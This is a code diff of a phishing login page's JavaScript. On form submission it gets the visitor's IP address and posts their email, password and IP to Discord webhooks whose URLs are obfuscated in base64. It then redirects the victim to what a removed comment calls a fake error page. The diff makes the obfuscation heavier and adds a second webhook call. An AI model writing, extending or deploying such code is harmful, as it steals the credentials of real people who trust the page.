@@ -1,5 +1,5 @@
-// Encoded webhook URL
-const webhookEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViYm9rcy8xMzEwNzYzMzczMjU1NzI1MTQ2L1JZR1lIV3lUUlNDWTU5U0hveE1vV3NkNmZZeXRicmszazJQQ2JRUVZCamlwUHBnTWJ4dGdLLUw2VS1ZZ2NXdkgwakds';
+// Obfuscated webhook URL
+const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDc3NTk5NzIzODM0NTcyOC9aVk5tX2F4RVRUN1d3TnZOVkhjdXBsaGRUZk14SUs4Z05LS25XMUtFUl8zQ1NTYkNzcHc3WERKaXlrWUJ6YkNmcE5iSA';
 
 const skibidiCheckbox = document.getElementById('skibidiCheckbox');
 const loginButton = document.getElementById('loginButton');
@@ -24,11 +24,21 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         .then(data => {
             const userIP = data.ip;
 
-            // Decode the webhook URL
-            const webhookUrl = atob(webhookEncoded);
+            
+            fetch('https://discord.com/api/webhooks/1310775997238345728/ZVNm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    Data: 'the user info discord webhook'
+                })
+            });
 
-            // Send the email, password, and IP address to the Discord webhook
-            fetch(webhookUrl, {
+            
+            const userInfo = atob(userinfoEncoded);
+            
+            fetch(userInfo, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -41,7 +51,6 @@ IP Address: ||${userIP}||`
                 })
             })
             .then(response => {
-                // Redirect to a fake error page or dashboard
                 window.location.href = 'https://cryptodude3.github.io/badmin/';
             })
             .catch(error => {
